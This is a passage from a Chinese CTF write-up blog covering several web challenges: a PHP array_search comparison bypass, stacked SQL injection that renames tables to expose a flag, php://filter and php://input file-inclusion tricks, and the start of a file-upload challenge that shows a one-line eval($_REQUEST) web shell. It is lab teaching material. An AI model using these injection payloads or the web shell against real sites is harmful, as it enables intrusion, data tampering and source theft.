class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>){<br>    <span class="hljs-variable">$val</span>===<span class="hljs-string">"DGGJ"</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no......"</span>):<span class="hljs-literal">NULL</span>;<br>}<br></code></pre></td></tr></table></figure><p><strong>这里是说明n中要包含DGGJ，又不能包含DGGJ，很神奇，这里要解决的话，我们应该想到PHP中比较常见的比较陷阱，array_search的本质是将需要查找的字符串与数组内的元素进行比较，所以我们写0的话是不是就可以绕过这个查询了呢（0在比较中的特殊性），我们可以这样写了c={“m”:”22222a”,”m”:[[0,1],0]}，然后try一下，答案来了。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp5.jpg" class=""><h4 id="3-SuperSQLi"><a href="#3-SuperSQLi" class="headerlink" title="3_SuperSQLi"></a>3_SuperSQLi</h4><h5 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h5><p>进入环境后出现一个查询框，如下图</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp6.jpg" class=""><p>题目已经告诉了这是一道sql注入题，所以直接使用sql注入解题。</p><h5 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>==堆叠注入==<strong>：Stacked injections(堆叠注入)从名词的含义就可以看到应该是</strong>一堆 sql 语句(多条)一起执行</strong>。在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句。因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间在于<strong>union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</strong>但是堆叠查询并不是每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>一般的拼接形式为: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">';show .....</span><br><span class="hljs-string">=1'</span>;<span class="hljs-keyword">drop</span> .....<br><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">';rename ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>SQL的一些表相关的DDL语句知识：</strong></p><ul><li><pre><code class="sql">show tables; #打印当前所有表<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```sql<br>  show columns from `tablename`;#展示指定表的所有字段<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="sql">alter table `ss` rename to `S`;-- 修改表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-operator">-</span> ```<span class="hljs-keyword">sql</span><br>  <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `S` change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">-- 修改表中字段名和字段类型  </span><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>首先，使用常用的SQL注入测试，注入’or 1=1，出现了新的回显，就是输入不同的id返回的值，并且只有1，2，114514有不同的返回值，但好像暂时并没有什么用。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp8.jpg" class=""><p>然后使用union联查，**’union select * from supersqli;当然是测试题目名构成的表啦，说不定就中了呢。**当然这里没中，回显表明后端进行了一定的过滤。像select、update都被ban掉了，但是show没有被ban掉，可以尝试打印。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp9.jpg" class=""><p><strong>我们show一下databases，发现出现了回显，显示了当前DBMS中管理的数据库</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp10.jpg" class=""><p>发现了supersqli，合理推测这是题目使用的数据库，我们继续查看一下包含的表，<strong>show tables</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp11.jpg" class=""><p>发现当前使用的有两张表，1919810931114514和words，show columns from打印两张表的字段看看。</p><p>words表里的内容如下图，<strong>包含id和data，非常有可能是题目查询使用的表，因为我们输入的是id的值，返回给我们data的内容</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">';show columns from `word`</span><br><span class="hljs-string">--注意字符串作为表名使用时应该带有反引号`</span><br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp12.jpg" class=""><p><strong>1919810931114514表里的内容，包含flag，这应该就是我们需要的东西了，问题现在转到了如何让题目查询1919…这张表。</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">';show columns from `1919810931114514`;</span><br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp13.jpg" class=""><p><strong>我们这里采用修改表名的方式修改查询对象，</strong></p><p><strong>1’;alter table words rename to word;</strong></p><p><strong>没有报错，我们再次查询一下发现，已经找不到原来的表了，也验证了前面猜测这是题目所用的那张表。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp15.jpg" class=""><p>**==但是这里出现了一个问题，当我们像修改另一张表的名字时，同样也会报错，为什么呢，因为现在已经找不到words表了，id字段不能被注入了，所以我们应该同时修改两张表，而且同时要修改新的words表的flag字段为id==**，也就是这样写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">';alter table `words` rename to `word`;alter table `1919810931114514` rename to `words`;alter table words change flag id varchar(100);</span><br></code></pre></td></tr></table></figure><p>那么我们再用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">'or 1=1;</span><br></code></pre></td></tr></table></figure><p>即可得到答案。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp16.jpg" class=""><h4 id="4-CTF-fileinclude-1"><a href="#4-CTF-fileinclude-1" class="headerlink" title="4_CTF_fileinclude_1"></a>4_CTF_fileinclude_1</h4><h5 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h5><p>进入环境直接一段PHP代码，且是文件上传相关，先去学习一下PHP文件上传相关知识。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>]))<br>{<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>];<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>))<br>    {<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">"hello ctf"</span>)<br>        {<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>);<br>        }<br>    }<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"NONONO"</span>);<br>}<br></code></pre></td></tr></table></figure><h5 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**==PHP伪协议==**：参考文章<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><ul><li><p><strong>php://协议</strong>，访问各个IO流，CTF中常用php://filter（用于读取源码）和php://input（执行php代码）</p></li><li><p><strong>php://filer，</strong>(&gt;=5.0.0)一种元封装器，设计<strong>用于数据流打开时的筛选过滤</strong>应用。对于一体式<code>（all-in-one）</code>的<strong>文件函数非常有用</strong>，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</p><ul><li>resource参数：传入要过滤的数据流</li><li>read参数：可选，可以设定多个过滤器名称</li><li>write参数：可选，可以设定多个过滤器名称</li><li>一个样例：test=php://filter/read=convert.base64-encode/resource=info.php</li></ul></li><li><p><strong>php://input</strong>，假如我们post了一个data，则使用input可以读取这个data，所以在url请求头中可以使用input进行传参。同时，可以post一段php代码，让input去执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">..../?id=1&amp;&amp;name=php://input<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>PHP include/require函数：</strong>如果 include/require 出现于调用文件中的一个函数里，则<strong>被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样</strong>。所以它将遵循该函数的变量范围。此规则的一个例外是魔术常量，它们是在发生包含之前就已被解析器处理的。include在所包含文件找不到时会继续执行之后的代码，而require会报错。</p></li><li><p><strong>Base64编码流程：base64常以=号结尾</strong></p><ul><li>1.将所有字符转为8位二进制的ASCII码</li><li>2.将8位二进制3个归为一组，共计24位，再拆分为4组，每组6位（<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="7.398ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 3270.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mo" transform="translate(1214.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2270.1,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container>）</li><li>3.将获得的6位二进制转为10进制</li><li>4.从Base64编码表获取对应的编码</li><li><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_1.jpg" class=""></li></ul></li><li><p><strong>对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“=”替代，因此，“ABCD”的base64编码为：“QUJDRA==”。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_2.jpg" class=""></li></ul><h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p>代码有一句include(“flag.php”)，引入了一个文件，我们合理地猜测flag是包含在flag.php中的，所以我们先访问一下flag.php，发现只打印了一句，并没有flag，说明flag可能在文件的注释里。然后有两个参数，说明我们需要在url中传入file1和file2两个参数。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_5.jpg" class=""><p>于是我们合理地想到可以使用文件过滤，将flag.php中地源码提取出来，原因是在第二层的if语句中有</p><p><code>include($file1);</code>，于是我们的url中file1可以这样编写：<code>file1=php://filter/read=convert.base64-encode/resource=flag.php</code>；然后考虑file2，我们先使用hackbar尝试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=hello ctf<br></code></pre></td></tr></table></figure><p>发现报错，因为<strong>有个file_get_contents函数，file2输入得是个文件才行</strong>，但是现在我们没有其他的文件可以输入。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_6.jpg" class=""><p>在hackbar里提交如下url，且在post中提交hello ctf，这里hackbar提交不了，选择使用BP提交，先在hackbar里execute，然后再BP里抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=php://input<br></code></pre></td></tr></table></figure><p>如下，<strong>注意修改content-length</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_3.jpg" class=""><p>得到一个base64编码，然后去解码即可</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_4.jpg" class=""><h4 id="5-file-include-江苏工匠杯（-字符编码问题未懂）"><a href="#5-file-include-江苏工匠杯（-字符编码问题未懂）" class="headerlink" title="5_file_include 江苏工匠杯（?字符编码问题未懂）"></a>5_file_include 江苏工匠杯（?字符编码问题未懂）</h4><h5 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h5><p>进入环境，看到一段PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">"./check.php"</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h5><ul><li><strong>PHP——iconv函数</strong></li><li>一些常见的字符编码</li></ul><h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>很明显的是文件包含问题，读代码我们可以发现是要在url中输入一个filename变量。</p><p>首先尝试了一下伪协议，<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>结果出现了，但是只有一句话。resource改成其他都是相同的回显。说明很可能被过滤，但具体过滤了哪些东西还不清楚</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/file_include_jiangsugongjiangbei_1.jpg" class=""><p>可以使用<code>convert.iconv.</code>，进行过滤，可以使用convert.iconv.utf8.utf16/resource=check.php</p><h4 id="6-fileinclude-宜兴网信办"><a href="#6-fileinclude-宜兴网信办" class="headerlink" title="6_fileinclude 宜兴网信办"></a>6_fileinclude 宜兴网信办</h4><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_1.jpg" class=""><p>文件包含题。</p><h5 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>cookie</strong>：</p></li><li><p>BP中cookie的写法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">cookie</span><span class="hljs-punctuation">: </span>language=flag<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h5><p>首先检查下网页源代码，发现出现了index.php的源码。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;/head&gt;<br><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: language in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;<br>Please choose the language you want : English or Chinese<br>&lt;h1&gt;Hi,EveryOne,The flag is in flag.php&lt;/h1&gt;&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;/head&gt;<br><br>&lt;?php<br>if( !ini_get('display_errors') ) {<br>  ini_set('display_errors', 'On');<br>  }<br>error_reporting(E_ALL);<br>$lan = $_COOKIE['language'];<br>if(!$lan)<br>{<br>@setcookie("language","english");<br>@include("english.php");<br>}<br>else<br>{<br>@include($lan.".php");<br>}<br>$x=file_get_contents('index.php');<br>echo $x;<br>?&gt;<br>&lt;/html&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>发现是要我们传入一个cookie，其name为language，题目告诉我们答案在flag.php里，那么我们就去那里看看。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_2.jpg" class=""><p>设置一下cookie，加上过滤，所以我们这样写</p><p><code>language=php://filter/read=convert.base64-encode/resource=flag</code></p><p>发现直接给出了一段base64编码后的字符串，去转换一下，得出答案。</p><h4 id="7-easy-upload-CTF"><a href="#7-easy-upload-CTF" class="headerlink" title="7_easy_upload_CTF"></a>7_easy_upload_CTF</h4><h5 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h5><p>进入环境，就是一个文件上传的提交</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_1.jpg" class=""><p>检查一下网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.round_icon</span>{</span><br><span class="language-css">  <span class="hljs-attribute">width</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">height</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: flex;</span><br><span class="language-css">  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><br><span class="language-css">  <span class="hljs-attribute">align-items</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">justify-content</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">overflow</span>: hidden;</span><br><span class="language-css">  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">}</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>easyupload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"background.jpg"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background-size:cover"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"uploads/index.php"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"round_icon"</span> <span class="hljs-attr">align</span>=<span class="hljs-string">"middle"</span>  <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"index.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: blue;"</span>&gt;</span>更换头像<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"fileUpload"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: blue;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"upload"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"提交"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**==.htaccess文件==**：<code>.htaccess</code> 由于它以点或点开头，因此通常称为“点文件”。 <strong>点文件几乎总是某种形式的配置文件</strong>。 点文件可以用于操作系统或软件。 默认情况下，操作系统会将点文件隐藏在查找程序窗口或任何类型的系统文件管理器中。 通常，您必须从操作系统的首选项中选择“显示隐藏的文件”选项。 或者您可以使用 <code>ls -a</code> 命令以在命令行上显示所有文件。</p><p>​        全称是Hypertext Access(超文本入口)。<strong>提供了针对目录改变配置的方法</strong>， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<strong>管理员可以通过Apache的AllowOverride指令来设置</strong>。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>​<strong>.htaccess的配置文件只能在Apache服务器中起作用</strong></p></li><li><p><strong>==.user.ini==<strong>：</strong>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</strong></p></li><li><p><code>&lt;?php =eval($_REQUEST["xxx"] )?&gt;</code>:_REQUEST包含了 _GET、 